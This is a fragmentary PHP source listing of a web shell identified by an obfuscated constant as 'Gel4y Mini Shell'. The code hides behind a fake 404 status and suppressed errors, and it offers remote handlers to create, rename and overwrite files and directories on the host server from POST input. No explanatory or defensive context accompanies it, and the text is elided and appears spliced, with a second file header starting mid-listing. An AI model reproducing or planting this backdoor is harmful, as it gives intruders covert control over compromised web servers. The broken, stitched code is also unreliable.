...
<body style="background-color:#000;color:#fff;font-family:serif;">
	<div class="bg-dark table-responsive text-light border">
		<div class="d-flex justify-content-between p-1">
			...
			<div>
				...
				<a href="?p=<?= hex($p)."&a=".hex("newDir") ?>">+Directory</a>
			</div>
		</div>
	...
	<article class="bg-dark border table-responsive-sm mt-2">
		...
		<div class="px-2 py-2">
			...
			<?php ((isset($_POST["s"])) ? ($func[12]("$p/{$_POST["n"]}") ? a("folder name has been used", 0, "&a=".hex("newDir")) : ($func[15]("$p/{$_POST["n"]}") ? a("folder created successfully") : a("folder failed to create", 0))) : null); elseif ($a == "newFile"): ?>
<?php
error_reporting(0);
http_response_code(404);
define("self", "G\x65l\64y M\x69n\x69 Sh\x65ll");
...
<body style="background-color:#000;color:#fff;font-family:serif;">
	...
	<article class="bg-dark border table-responsive-sm mt-2">
		...
		<div class="px-2 py-2">
			...
			<?php ((isset($_POST["s"])) ? ($func[12]("$p/{$_POST["n"]}") ? a("file name has been used", 0, "&a=".hex("newFile")) : ($func[13]("$p/{$_POST["n"]}", $_POST["ctn"]) ? a("file created successfully",1,"&a=".hex("view")."&n=".hex($_POST["n"])) : a("file failed to create", 0))) : null); elseif ($a == "rename"): ?>
			...
			<?php ((isset($_POST["s"])) ? ($func[16]($p.'/'.nhx($_GET["n"]), $_POST["n"]) ? a("successfully changed the folder name") : a("failed to change the folder name", 0)) : null); elseif ($a == "edit"): ?>
			...
			<?php ((isset($_POST["s"])) ? ($func[13]($p.'/'.nhx($_GET["n"]), $_POST["ctn"]) ? a("file contents changed successfully", 1, "&a=".hex("view")."&n={$_GET["n"]}") : a("file contents failed to change")) : null); elseif ($a == "view"): ?>
